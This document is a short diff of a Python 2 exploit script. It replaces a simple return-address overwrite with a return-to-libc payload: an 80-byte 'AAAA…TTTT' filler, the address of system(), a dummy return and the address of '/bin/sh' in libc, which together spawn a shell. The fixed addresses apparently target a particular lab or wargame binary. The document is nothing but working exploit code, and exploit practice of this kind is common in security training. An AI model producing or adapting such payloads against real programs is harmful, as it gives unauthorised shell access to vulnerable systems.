@@ -2,13 +2,10 @@
 
 import struct
 
-value = struct.pack("I", 0x080484d3)
-value = struct.pack("I", 0xffffffff)
+system_address = struct.pack("I", 0xb7ecffb0)
+shellcode_address = struct.pack("I", 0xB7FB63BF) # Adress of /bin/sh in libc
 
-shellcode = "\xCC" * 4
-
-padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"
-
-payload = padding + value
+buff = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"
+payload = buff + system_address + "AAAA" + shellcode_address
 
 print payload
